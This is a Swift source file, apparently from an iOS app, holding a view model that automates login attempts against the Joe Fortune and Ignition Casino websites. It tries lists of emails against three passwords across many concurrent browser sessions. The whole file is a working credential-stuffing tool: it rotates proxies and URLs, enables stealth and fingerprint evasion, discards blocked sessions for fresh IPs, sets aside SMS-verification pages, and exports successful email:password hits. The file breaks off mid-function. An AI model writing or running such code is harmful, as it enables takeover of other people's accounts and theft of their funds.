import Foundation
import Observation
import SwiftUI
import UserNotifications
import UIKit

@Observable
@MainActor
class DualFindViewModel {
    var emails: [String] = []
    var passwords: [String] = ["", "", ""]
    var sessionCount: DualFindSessionCount = .six
    var emailInputText: String = ""

    var isRunning: Bool = false
    var isJoePaused: Bool = false
    var isIgnPaused: Bool = false
    var isStopping: Bool = false

    var joeEmailIndex: Int = 0
    var joePasswordIndex: Int = 0
    var ignEmailIndex: Int = 0
    var ignPasswordIndex: Int = 0
    var totalEmails: Int = 0
    var joeCompletedTests: Int = 0
    var ignCompletedTests: Int = 0

    var sessions: [DualFindSessionInfo] = []
    var logs: [PPSRLogEntry] = []
    var hits: [DualFindHit] = []
    var disabledEmails: Set<String> = []

    var showLoginFound: Bool = false
    var latestHit: DualFindHit?
    var hasResumePoint: Bool = false
    var copiedHitId: String?

    var activeIntervention: DualFindInterventionRequest?
    var showInterventionSheet: Bool = false
    var interventionResponse: DualFindInterventionAction?
    var interventionUnsureCount: Int = 0
    var interventionAutoHealCount: Int = 0

    let interventionLearning = UserInterventionLearningService.shared

    var appearanceMode: AppAppearanceMode = .dark
    var stealthEnabled: Bool = true
    var debugMode: Bool = false
    var testTimeout: TimeInterval = 90
    var maxConcurrency: Int = 8
    var automationSettings: AutomationSettings = AutomationSettings()

    private var resumePoint: DualFindResumePoint?
    private var runTask: Task<Void, Never>?
    private let persistKey = "dual_find_resume_v2"

    private var joePersistentSessions: [LoginSiteWebSession] = []
    private var ignPersistentSessions: [LoginSiteWebSession] = []
    private var joeCalibrations: [LoginCalibrationService.URLCalibration?] = []
    private var ignCalibrations: [LoginCalibrationService.URLCalibration?] = []

    private var joeNextEmailIdx: Int = 0
    private var ignNextEmailIdx: Int = 0

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    private let notifications = PPSRNotificationService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let blacklistService = BlacklistService.shared
    private let calibrationService = LoginCalibrationService.shared

    var isPaused: Bool {
        isJoePaused && isIgnPaused
    }

    var completedTests: Int {
        joeCompletedTests + ignCompletedTests
    }

    var progressText: String {
        guard totalEmails > 0 else { return "Ready" }
        let perPlatform = totalEmails * 3
        let jPw = joePasswordIndex + 1
        let iPw = ignPasswordIndex + 1
        return "JOE \(joeCompletedTests)/\(perPlatform) pw\(jPw) · IGN \(ignCompletedTests)/\(perPlatform) pw\(iPw)"
    }

    var progressFraction: Double {
        guard totalEmails > 0 else { return 0 }
        let totalCombos = totalEmails * 3 * 2
        guard totalCombos > 0 else { return 0 }
        return Double(completedTests) / Double(totalCombos)
    }

    var parsedEmailCount: Int {
        parseEmails(from: emailInputText).count
    }

    var canStart: Bool {
        parsedEmailCount > 0 && passwords.filter({ !$0.trimmingCharacters(in: .whitespaces).isEmpty }).count == 3
    }

    var runStatusLabel: String {
        if isJoePaused && isIgnPaused { return "PAUSED" }
        if isJoePaused { return "JOE PAUSED" }
        if isIgnPaused { return "IGN PAUSED" }
        return "RUNNING"
    }

    var runStatusColor: Color {
        if isJoePaused && isIgnPaused { return .yellow }
        if isJoePaused || isIgnPaused { return .orange }
        return .green
    }

    init() {
        notifications.requestPermission()
        loadResumePoint()
        loadSettings()
        loadAppSettings()
    }

    func parseEmails(from text: String) -> [String] {
        text.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty && $0.contains("@") }
    }

    func startRun() {
        let parsed = parseEmails(from: emailInputText)
        guard !parsed.isEmpty else { return }
        let validPasswords = passwords.map { $0.trimmingCharacters(in: .whitespaces) }
        guard validPasswords.allSatisfy({ !$0.isEmpty }) else { return }

        reloadAllSettings()

        automationSettings.trueDetectionEnabled = true
        automationSettings.trueDetectionPriority = true
        if let data = try? JSONEncoder().encode(automationSettings) {
            UserDefaults.standard.set(data, forKey: "automation_settings_v1")
        }

        emails = parsed
        totalEmails = parsed.count
        joeEmailIndex = 0
        joePasswordIndex = 0
        ignEmailIndex = 0
        ignPasswordIndex = 0
        joeCompletedTests = 0
        ignCompletedTests = 0
        disabledEmails.removeAll()
        hits.removeAll()
        logs.removeAll()
        sessions.removeAll()
        isJoePaused = false
        isIgnPaused = false
        isStopping = false

        buildSessionInfoDisplay()

        logSettingsSummary()
        log("Starting Dual Find: \(totalEmails) emails × 3 passwords × 2 sites = \(totalEmails * 3 * 2) combinations")
        log("Session mode: \(sessionCount.label) — persistent sessions, field-clear pattern")
        log("TRUE DETECTION enforced as default for both Joe and Ignition")

        isRunning = true
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account scan")

        runTask = Task {
            await executeRun(emails: emails, passwords: validPasswords)
        }
    }

    func resumeRun() {
        guard let rp = resumePoint else { return }

        reloadAllSettings()

        emails = rp.emails
        totalEmails = rp.emails.count
        joeEmailIndex = rp.joeEmailIndex
        joePasswordIndex = rp.joePasswordIndex
        ignEmailIndex = rp.ignEmailIndex
        ignPasswordIndex = rp.ignPasswordIndex
        disabledEmails = Set(rp.disabledEmails)
        hits = rp.foundLogins
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
        joeCompletedTests = rp.joeCompletedTests
        ignCompletedTests = rp.ignCompletedTests
        logs.removeAll()
        sessions.removeAll()
        isJoePaused = false
        isIgnPaused = false
        isStopping = false

        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }

        buildSessionInfoDisplay()

        logSettingsSummary()
        log("Resuming Dual Find — JOE from Email \(joeEmailIndex + 1)/\(totalEmails) PW \(joePasswordIndex + 1)/3, IGN from Email \(ignEmailIndex + 1)/\(totalEmails) PW \(ignPasswordIndex + 1)/3")

        isRunning = true
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account resume")

        runTask = Task {
            await executeRun(emails: emails, passwords: passwords)
        }
    }

    func pauseAll() {
        isJoePaused = true
        isIgnPaused = true
        log("Paused — all sessions frozen", level: .warning)
    }

    func resumeAll() {
        isJoePaused = false
        isIgnPaused = false
        log("Resumed all platforms")
    }

    func stopRun() {
        isStopping = true
        isJoePaused = false
        isIgnPaused = false
        log("Stopping — finishing current tests...", level: .warning)
    }

    func clearResumePoint() {
        resumePoint = nil
        hasResumePoint = false
        UserDefaults.standard.removeObject(forKey: persistKey)
    }

    func copyHit(_ hit: DualFindHit) {
        UIPasteboard.general.string = hit.copyText
        copiedHitId = hit.id
        Task {
            try? await Task.sleep(for: .seconds(1.5))
            if copiedHitId == hit.id {
                copiedHitId = nil
            }
        }
    }

    func exportAllHits() -> String {
        hits.map { "\($0.email):\($0.password) [\($0.platform)]" }.joined(separator: "\n")
    }

    // MARK: - Core Run Loop

    private func executeRun(emails: [String], passwords: [String]) async {
        await withTaskGroup(of: Void.self) { group in
            group.addTask {
                await self.platformLoop(site: .joefortune, emails: emails, passwords: passwords)
            }
            group.addTask {
                await self.platformLoop(site: .ignition, emails: emails, passwords: passwords)
            }
            await group.waitForAll()
        }

        teardownAllPersistentSessions()
        finalizeRun()
    }

    private func platformLoop(site: LoginTargetSite, emails: [String], passwords: [String]) async {
        let perSite = sessionCount.perSite
        let siteLabel = site == .joefortune ? "JOE" : "IGN"
        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
        let isJoe = site == .joefortune

        let startPwIdx = isJoe ? joePasswordIndex : ignPasswordIndex

        log("[\(siteLabel)] Starting platform loop: \(perSite) persistent sessions")

        var webSessions: [LoginSiteWebSession] = []
        var calibrations: [LoginCalibrationService.URLCalibration?] = []

        for i in 0..<perSite {
            guard !isStopping else { return }
            let label = "\(siteLabel)-\(i + 1)"

            let session = createPersistentWebSession(site: site, sessionIndex: i)
            webSessions.append(session)
            calibrations.append(nil)

            let loaded = await navigateAndSetupSession(session: session, site: site, label: label)
            if !loaded {
                log("[\(label)] Failed to load login page — will retry on first use", level: .error)
            }

            let cal = await calibrateSession(session: session, site: site, label: label)
            calibrations[i] = cal

            updateSession(id: "\(platformName)_\(i)", email: "", status: "Ready", active: false)
        }

        if isJoe {
            joePersistentSessions = webSessions
            joeCalibrations = calibrations
        } else {
            ignPersistentSessions = webSessions
            ignCalibrations = calibrations
        }

        for pwIdx in startPwIdx..<3 {
            guard !isStopping else { break }
            let password = passwords[pwIdx]
            log("[\(siteLabel)] === Password Round \(pwIdx + 1)/3 ===")

            if isJoe {
                joePasswordIndex = pwIdx
            } else {
                ignPasswordIndex = pwIdx
            }

            for i in 0..<webSessions.count {
                guard !isStopping else { break }
                let label = "\(siteLabel)-\(i + 1)"
                let session = webSessions[i]

                if pwIdx > startPwIdx || (pwIdx == startPwIdx && i > 0) {
                    await session.clearPasswordFieldOnly()
                    try? await Task.sleep(for: .milliseconds(200))
                    log("[\(label)] Cleared password field for pw \(pwIdx + 1)")
                }

                let cal = calibrations[i]
                let fillResult = await session.fillPasswordCalibrated(password, calibration: cal)
                if !fillResult.success {
                    let tdResult = await session.trueDetectionFillPassword(password)
                    if !tdResult.success {
                        log("[\(label)] Password fill failed — trying legacy", level: .warning)
                        _ = await session.fillPassword(password)
                    }
                }
                log("[\(label)] Password \(pwIdx + 1) entered")
                updateSession(id: "\(platformName)_\(i)", email: "", status: "PW\(pwIdx + 1) Ready", active: true)
            }

            let emailStartIdx: Int
            if pwIdx == startPwIdx {
                emailStartIdx = isJoe ? joeEmailIndex : ignEmailIndex
            } else {
                emailStartIdx = 0
            }

            if isJoe {
                joeNextEmailIdx = emailStartIdx
            } else {
                ignNextEmailIdx = emailStartIdx
            }

            await withTaskGroup(of: Void.self) { group in
                for i in 0..<webSessions.count {
                    let sessionIdx = i
                    group.addTask {
                        await self.sessionEmailLoop(
                            sessionIndex: sessionIdx,
                            site: site,
                            emails: emails,
                            password: password,
                            passwordIndex: pwIdx
                        )
                    }
                }
                await group.waitForAll()
            }

            log("[\(siteLabel)] Password \(pwIdx + 1)/3 complete", level: .success)
        }

        log("[\(siteLabel)] Platform loop complete — all 3 passwords tested", level: .success)
    }

    // MARK: - Per-Session Email Processing Loop

    private func sessionEmailLoop(sessionIndex: Int, site: LoginTargetSite, emails: [String], password: String, passwordIndex: Int) async {
        let siteLabel = site == .joefortune ? "JOE" : "IGN"
        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
        let label = "\(siteLabel)-\(sessionIndex + 1)"
        let sessionInfoId = "\(platformName)_\(sessionIndex)"
        let isJoe = site == .joefortune

        while true {
            guard !isStopping else { break }

            let sitePaused = isJoe ? isJoePaused : isIgnPaused
            if sitePaused {
                while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
                    try? await Task.sleep(for: .milliseconds(500))
                }
            }
            guard !isStopping else { break }

            guard let emailIdx = grabNextEmail(for: site) else { break }
            let email = emails[emailIdx]

            if isJoe {
                joeEmailIndex = max(joeEmailIndex, emailIdx)
            } else {
                ignEmailIndex = max(ignEmailIndex, emailIdx)
            }

            if disabledEmails.contains(email.lowercased()) {
                log("[\(label)] Skipping disabled: \(email)")
                incrementCompleted(for: site)
                continue
            }

            updateSession(id: sessionInfoId, email: email, status: "Testing", active: true)

            guard let session = getPersistentSession(site: site, index: sessionIndex) else {
                log("[\(label)] No session available — skipping", level: .error)
                incrementCompleted(for: site)
                continue
            }

            let fieldsCheck = await session.verifyLoginFieldsExist()
            if fieldsCheck.found < 2 {
                log("[\(label)] Form fields missing — reloading page", level: .warning)
                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                if reloaded {
                    let cal = await calibrateSession(session: session, site: site, label: label)
                    setCalibration(site: site, index: sessionIndex, calibration: cal)
                    _ = await session.fillPasswordCalibrated(password, calibration: cal)
                } else {
                    log("[\(label)] Page reload failed — burning session", level: .error)
                    await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
                }
            }

            await session.clearEmailFieldOnly()
            try? await Task.sleep(for: .milliseconds(100))

            let cal = getCalibration(site: site, index: sessionIndex)
            let emailFillResult = await session.fillUsernameCalibrated(email, calibration: cal)
            if !emailFillResult.success {
                let tdResult = await session.trueDetectionFillEmail(email)
                if !tdResult.success {
                    log("[\(label)] Email fill failed for \(email) — trying legacy", level: .warning)
                    _ = await session.fillUsername(email)
                }
            }

            try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))

            let calForBtn = getCalibration(site: site, index: sessionIndex)
            let submitResult = await session.clickLoginButtonCalibrated(calibration: calForBtn)
            if !submitResult.success {
                let tdSubmit = await session.trueDetectionTripleClickSubmit()
                if !tdSubmit.success {
                    _ = await session.pressEnterOnPasswordField()
                }
            }

            try? await Task.sleep(for: .seconds(6))

            var outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)

            if outcome == .unsure {
                let pageContent = await session.getPageContent()
                let currentURL = await session.getCurrentURL()
                let host = URL(string: currentURL)?.host ?? currentURL

                if let autoHeal = interventionLearning.suggestAutoHeal(host: host, pageContent: pageContent, currentURL: currentURL),
                   autoHeal.confidence >= 0.7 {
                    let healedOutcome: DualFindTestOutcome
                    switch autoHeal.outcome.lowercased() {
                    case "success": healedOutcome = .success
                    case "disabled": healedOutcome = .disabled
                    case "noaccount", "noacc": healedOutcome = .noAccount
                    default: healedOutcome = .unsure
                    }
                    if healedOutcome != .unsure {
                        outcome = healedOutcome
                        interventionAutoHealCount += 1
                        log("[\(label)] AI auto-healed unsure → \(autoHeal.outcome) (\(String(format: "%.0f%%", autoHeal.confidence * 100)) confidence, learned from \(interventionLearning.totalCorrections) corrections)", level: .success)
                    }
                }
            }

            if outcome == .unsure {
                interventionUnsureCount += 1
                log("[\(label)] \(email) — UNSURE result, freezing session for user intervention", level: .warning)
                updateSession(id: sessionInfoId, email: email, status: "UNSURE ⚠️", active: true)

                let pageContent = await session.getPageContent()
                let currentURL = await session.getCurrentURL()

                let request = DualFindInterventionRequest(
                    sessionLabel: label,
                    email: email,
                    password: password,
                    platform: site.rawValue,
                    pageContent: pageContent,
                    currentURL: currentURL,
                    sessionIndex: sessionIndex,
                    site: site,
                    passwordIndex: passwordIndex
                )

                activeIntervention = request
                interventionResponse = nil
                showInterventionSheet = true

                while interventionResponse == nil && !isStopping {
                    try? await Task.sleep(for: .milliseconds(300))
                }
                showInterventionSheet = false

                if let response = interventionResponse {
                    let host = URL(string: currentURL)?.host ?? currentURL
                    log("[\(label)] User intervention: \(response.rawValue) for \(email)", level: .info)

                    switch response {
                    case .markSuccess:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "success", actionTaken: response.rawValue)
                        outcome = .success

                    case .markNoAccount:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "noAccount", actionTaken: response.rawValue)
                        outcome = .noAccount

                    case .markDisabled:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "disabled", actionTaken: response.rawValue)
                        outcome = .disabled

                    case .restartWithNewIP:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
                        log("[\(label)] Restarting with new IP per user request", level: .warning)
                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
                            let retryOutcome = await retryEmailOnFreshSession(
                                session: freshSession, email: email, password: password,
                                site: site, sessionIndex: sessionIndex, label: label
                            )
                            outcome = retryOutcome
                        } else {
                            outcome = .transient
                        }

                    case .pressSubmitAgain:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
                        log("[\(label)] Pressing submit 3 more times per user request", level: .info)
                        for submitAttempt in 1...3 {
                            let calRetry = getCalibration(site: site, index: sessionIndex)
                            let retrySubmit = await session.clickLoginButtonCalibrated(calibration: calRetry)
                            if !retrySubmit.success {
                                _ = await session.pressEnterOnPasswordField()
                            }
                            log("[\(label)] Extra submit \(submitAttempt)/3", level: .info)
                            try? await Task.sleep(for: .seconds(3))
                        }
                        outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)

                    case .disableURL:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
                        urlRotation.reportFailure(urlString: currentURL)
                        urlRotation.reportFailure(urlString: currentURL)
                        log("[\(label)] URL disabled per user request: \(currentURL)", level: .warning)
                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
                            let retryOutcome = await retryEmailOnFreshSession(
                                session: freshSession, email: email, password: password,
                                site: site, sessionIndex: sessionIndex, label: label
                            )
                            outcome = retryOutcome
                        } else {
                            outcome = .transient
                        }

                    case .disableViewport:
                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
                        log("[\(label)] Viewport disabled per user request — rebuilding session", level: .warning)
                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
                            let retryOutcome = await retryEmailOnFreshSession(
                                session: freshSession, email: email, password: password,
                                site: site, sessionIndex: sessionIndex, label: label
                            )
                            outcome = retryOutcome
                        } else {
                            outcome = .transient
                        }

                    case .skipAndContinue:
                        outcome = .noAccount
                    }

                    activeIntervention = nil
                    interventionResponse = nil
                }
            }

            switch outcome {
            case .success:
                let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
                hits.append(hit)
                latestHit = hit
                showLoginFound = true
                log("🎯 LOGIN FOUND: \(email) on \(site.rawValue)", level: .success)
                sendLoginFoundNotification(email: email, platform: site.rawValue)
                updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

                saveResumePoint()

                if isJoe {
                    isJoePaused = true
                } else {
                    isIgnPaused = true
                }

                while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
                    try? await Task.sleep(for: .milliseconds(500))
                }
                if isStopping { break }
                showLoginFound = false

                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                if reloaded {
                    let newCal = await calibrateSession(session: session, site: site, label: label)
                    setCalibration(site: site, index: sessionIndex, calibration: newCal)
                    _ = await session.fillPasswordCalibrated(password, calibration: newCal)
                }

            case .disabled:
                disabledEmails.insert(email.lowercased())
                log("[\(label)] \(email) — DISABLED (eliminated from all testing)", level: .error)
                updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

                let checkFields = await session.verifyLoginFieldsExist()
                if checkFields.found < 2 {
                    let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                    if reloaded {
                        let newCal = await calibrateSession(session: session, site: site, label: label)
                        setCalibration(site: site, index: sessionIndex, calibration: newCal)
                        _ = await session.fillPasswordCalibrated(password, calibration: newCal)
                    }
                }

            case .transient:
                log("[\(label)] \(email) — transient error, burning session & retrying", level: .warning)
                updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)

                await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)

                guard let freshSession = getPersistentSession(site: site, index: sessionIndex) else {
                    log("[\(label)] Replacement session unavailable", level: .error)
                    incrementCompleted(for: site)
                    continue
                }

                let retryOutcome = await retryEmailOnFreshSession(
                    session: freshSession, email: email, password: password,
                    site: site, sessionIndex: sessionIndex, label: label
                )

                switch retryOutcome {
                case .success:
                    let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
                    hits.append(hit)
                    latestHit = hit
                    showLoginFound = true
                    log("🎯 LOGIN FOUND (retry): \(email) on \(site.rawValue)", level: .success)
                    sendLoginFoundNotification(email: email, platform: site.rawValue)
                    updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

                    saveResumePoint()

                    if isJoe {
                        isJoePaused = true
                    } else {
                        isIgnPaused = true
                    }

                    while (isJoe ? isJoePaused : isIgnPaused) && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    if isStopping { break }
                    showLoginFound = false

                case .disabled:
                    disabledEmails.insert(email.lowercased())
                    log("[\(label)] retry: \(email) — DISABLED (eliminated)", level: .error)
                    updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

                default:
                    log("[\(label)] retry: \(email) — \(retryOutcome) (moving on)", level: .warning)
                    updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
                }

            case .noAccount:
                log("[\(label)] \(email) — no account (pw \(passwordIndex + 1))")
                updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)

            case .unsure:
                log("[\(label)] \(email) — unresolved unsure (pw \(passwordIndex + 1))", level: .warning)
                updateSession(id: sessionInfoId, email: email, status: "Unsure", active: false)
            }

            incrementCompleted(for: site)
        }
    }

    private func incrementCompleted(for site: LoginTargetSite) {
        if site == .joefortune {
            joeCompletedTests += 1
        } else {
            ignCompletedTests += 1
        }
    }

    // MARK: - Response Evaluation

    private func evaluateResponseWithTimeout(session: LoginSiteWebSession, timeout: TimeInterval) async -> DualFindTestOutcome {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let result: DualFindTestOutcome = await withTaskGroup(of: DualFindTestOutcome.self) { group in
            group.addTask {
                return await self.evaluateResponse(session: session)
            }
            group.addTask {
                try? await Task.sleep(for: .seconds(timeout))
                return .transient
            }
            let first = await group.next() ?? .transient
            group.cancelAll()
            return first
        }
        return result
    }

    private func evaluateResponse(session: LoginSiteWebSession) async -> DualFindTestOutcome {
        let pageContent = await session.getPageContent()
        let contentLower = pageContent.lowercased()
        let currentURL = await session.getCurrentURL()
        let urlLower = currentURL.lowercased()

        let successMarkers = ["balance", "wallet", "my account", "logout", "dashboard", "deposit"]
        for marker in successMarkers {
            if contentLower.contains(marker) && !urlLower.contains("/login") && !urlLower.contains("/signin") {
                return .success
            }
        }

        if !urlLower.contains("/login") && !urlLower.contains("/signin") && !urlLower.contains("error") {
            for marker in ["balance", "wallet", "my account", "logout"] {
                if contentLower.contains(marker) {
                    return .success
                }
            }
            let tdValidation = await session.trueDetectionValidateSuccess()
            if tdValidation.success {
                return .success
            }
        }

        if contentLower.contains("disabled") || contentLower.contains("account is disabled") || contentLower.contains("temporarily disabled") {
            return .disabled
        }

        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
            return .transient
        }

        let isIgnition = urlLower.contains("ignition")
        if isIgnition {
            let smsKeywords = ["sms", "text message", "verification code", "verify your phone",
                               "send code", "sent a code", "enter the code", "phone verification",
                               "mobile verification", "confirm your number", "code sent",
                               "enter code", "security code sent", "check your phone"]
            for keyword in smsKeywords {
                if contentLower.contains(keyword) {
                    return .transient
                }
            }
        }
        if contentLower.contains("sms") {
            return .transient
        }

        if pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 30 {
            return .transient
        }

        let incorrectMarkers = ["incorrect password", "invalid credentials", "wrong password",
                                "invalid email or password", "login failed", "authentication failed",
                                "no account found", "account not found", "invalid email", "invalid username"]
        for marker in incorrectMarkers {
            if contentLower.contains(marker) {
                return .noAccount
            }
        }

        if urlLower.contains("/login") || urlLower.contains("/signin") || urlLower.contains("overlay=login") {
            return .unsure
        }

        return .noAccount
    }

    // MARK: - Retry on Fresh Session

    private func retryEmailOnFreshSession(session: LoginSiteWebSession, email: String, password: String, site: LoginTargetSite, sessionIndex: Int, label: String) async -> DualFindTestOutcome {
        await session.clearEmailFieldOnly()
        try? await Task.sleep(for: .milliseconds(100))

        let cal = getCalibration(site: site, index: sessionIndex)
        let fillResult = await session.fillUsernameCalibrated(email, calibration: cal)
        if !fillResult.success {
            let tdResult = await session.trueDetectionFillEmail(email)
            if !tdResult.success {
                _ = await session.fillUsername(email)
            }
        }

        try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))

        let submitResult = await session.clickLoginButtonCalibrated(calibration: cal)
        if !submitResult.success {
            let tdSubmit = await session.trueDetectionTripleClickSubmit()
            if !tdSubmit.success {
                _ = await session.pressEnterOnPasswordField()
            }
        }

        try? await Task.sleep(for: .seconds(6))

        return await evaluateResponseWithTimeout(session: session, timeout: 10)
    }

    // MARK: - Persistent Session Management

    private func createPersistentWebSession(site: LoginTargetSite, sessionIndex: Int) -> LoginSiteWebSession {
        let proxyTarget: ProxyRotationService.ProxyTarget = site == .joefortune ? .joe : .ignition
        let netConfig = networkFactory.appWideConfig(for: proxyTarget)

        urlRotation.isIgnitionMode = (site == .ignition)
        let targetURL = urlRotation.nextURL() ?? site.url

        PPSRStealthService.shared.applySettings(automationSettings)
        let session = LoginSiteWebSession(targetURL: targetURL, networkConfig: netConfig)
        session.stealthEnabled = stealthEnabled
        session.fingerprintValidationEnabled = automationSettings.fingerprintValidationEnabled
        session.setUp(wipeAll: true)

        return session
    }

    private func navigateAndSetupSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> Bool {
        for attempt in 1...3 {
            let loaded = await session.loadPage(timeout: automationSettings.pageLoadTimeout)
            if loaded {
                await session.dismissCookieNotices()
                try? await Task.sleep(for: .milliseconds(300))
                return true
            }
            log("[\(label)] Page load attempt \(attempt)/3 failed: \(session.lastNavigationError ?? "unknown")", level: .warning)
            if attempt < 3 {
                try? await Task.sleep(for: .seconds(Double(attempt) * 2))
                if attempt == 2 {
                    session.tearDown(wipeAll: true)
                    session.setUp(wipeAll: true)
                }
            }
        }
        return false
    }

    private func calibrateSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> LoginCalibrationService.URLCalibration? {
        let urlString = session.targetURL.absoluteString
        if let existing = calibrationService.calibrationFor(url: urlString), existing.isCalibrated {
            log("[\(label)] Using saved calibration")
            return existing
        }
        if let cal = await session.autoCalibrate() {
            calibrationService.saveCalibration(cal, forURL: urlString)
            log("[\(label)] Auto-calibrated: email=\(cal.emailField?.cssSelector ?? "nil") pass=\(cal.passwordField?.cssSelector ?? "nil") btn=\(cal.loginButton?.cssSelector ?? "nil")")
            return cal
        }
        log("[\(label)] Calibration failed — using generic selectors", level: .warning)
        return nil
    }

    private func burnAndReplaceSession(site: LoginTargetSite, index: Int, password: String, label: String) async {
        log("[\(label)] Burning session and creating replacement", level: .warning)

        let oldSession = getPersistentSession(site: site, index: index)
        oldSession?.tearDown(wipeAll: true)

        let newSession = createPersistentWebSession(site: site, sessionIndex: index)
        setPersistentSession(site: site, index: index, session: newSession)

        let loaded = await navigateAndSetupSession(session: newSession, site: site, label: label)
        guard loaded else {
            log("[\(label)] Replacement session failed to load", level: .error)
            return
        }

        let cal = await calibrateSession(session: newSession, site: site, label: label)
        setCalibration(site: site, index: index, calibration: cal)

        let fillResult = await newSession.fillPasswordCalibrated(password, calibration: cal)
        if !fillResult.success {
            _ = await newSession.trueDetectionFillPassword(password)
        }
        log("[\(label)] Replacement session ready")
    }

    private func getPersistentSession(site: LoginTargetSite, index: Int) -> LoginSiteWebSession? {
        let sessions = site == .joefortune ? joePersistentSessions : ignPersistentSessions
        guard index < sessions.count else { return nil }
        return sessions[index]
    }

    private func setPersistentSession(site: LoginTargetSite, index: Int, session: LoginSiteWebSession) {
        if site == .joefortune {
            guard index < joePersistentSessions.count else { return }
            joePersistentSessions[index] = session
        } else {
            guard index < ignPersistentSessions.count else { return }
            ignPersistentSessions[index] = session
        }
    }

    private func getCalibration(site: LoginTargetSite, index: Int) -> LoginCalibrationService.URLCalibration? {
        let cals = site == .joefortune ? joeCalibrations : ignCalibrations
        guard index < cals.count else { return nil }
        return cals[index]
    }

    private func setCalibration(site: LoginTargetSite, index: Int, calibration: LoginCalibrationService.URLCalibration?) {
        if site == .joefortune {
            guard index < joeCalibrations.count else { return }
            joeCalibrations[index] = calibration
        } else {
            guard index < ignCalibrations.count else { return }
            ignCalibrations[index] = calibration
        }
    }

    private func grabNextEmail(for site: LoginTargetSite) -> Int? {
        if site == .joefortune {
            let idx = joeNextEmailIdx
            guard idx < emails.count else { return nil }
            joeNextEmailIdx += 1
            return idx
        } else {
            let idx = ignNextEmailIdx
            guard idx < emails.count else { return nil }
            ignNextEmailIdx += 1
            return idx
        }
    }

    private func teardownAllPersistentSessions() {
        for session in joePersistentSessions {
            session.tearDown(wipeAll: true)
        }
        for session in ignPersistentSessions {
            session.tearDown(wipeAll: true)
        }
        joePersistentSessions.removeAll()
        ignPersistentSessions.removeAll()
        joeCalibrations.removeAll()
        ignCalibrations.removeAll()
    }

    // MARK: - Session Display Info

    private func buildSessionInfoDisplay() {
        sessions.removeAll()
        let perSite = sessionCount.perSite
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Joe Fortune"))
        }
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Ignition Casino"))
        }
    }

    private func updateSession(id: String, email: String, status: String, active: Bool) {
        if let idx = sessions.firstIndex(where: { $0.id == id }) {
            sessions[idx].currentEmail = email
            sessions[idx].status = status
            sessions[idx].isActive = active
        }
    }

    // MARK: - Finalize

    private func finalizeRun() {
        isRunning = false
        isJoePaused = false
        isIgnPaused = false
        let stoppedEarly = isStopping
        isStopping = false
        backgroundService.endExtendedBackgroundExecution()

        let totalPossible = totalEmails * 3 * 2

        if stoppedEarly {
            log("Run stopped: \(hits.count) hits, \(disabledEmails.count) disabled, tested \(completedTests)/\(totalPossible)", level: .warning)
            saveResumePoint()
        } else {
            log("Run complete: \(hits.count) hits found, \(disabledEmails.count) disabled, \(totalPossible) combinations tested", level: .success)
            clearResumePoint()
        }

